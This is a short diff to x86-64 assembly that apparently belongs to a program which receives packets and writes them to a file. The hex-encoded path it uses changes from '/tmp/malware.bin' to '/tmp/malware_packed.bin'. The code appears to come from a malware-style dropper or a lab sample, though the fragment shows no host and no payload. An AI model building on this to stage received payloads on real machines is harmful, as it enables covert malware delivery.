@@ -15,8 +15,9 @@ _start:
     mov %rax, -4(%rbp)
 
 
-    pushq $0
-    mov $0x6e69622e65726177, %rsi
+   mov $0x6e69622e64656b, %rsi
+    push %rsi
+    mov $0x6361705f65726177, %rsi
     push %rsi
     mov $0x6c616d2f706d742f, %rsi
     push %rsi
@@ -26,7 +27,7 @@ _start:
     syscall
     pop %rcx
     pop %rcx
-    popq %rcx
+    pop %rcx
     mov %rax, 1024(%rsp)
     cmp $0xFFFFFFFFFFFFFFFF, %rax # exit if error
     mov $6, %rdi 
@@ -146,8 +147,9 @@ _recv_packet_end_2:
     mov $3, %rax # close syscall
     syscall
 
-    pushq $0
-    mov $0x6e69622e65726177, %rsi
+    mov $0x6e69622e64656b, %rsi
+    push %rsi
+    mov $0x6361705f65726177, %rsi
     push %rsi
     mov $0x6c616d2f706d742f, %rsi
     push %rsi
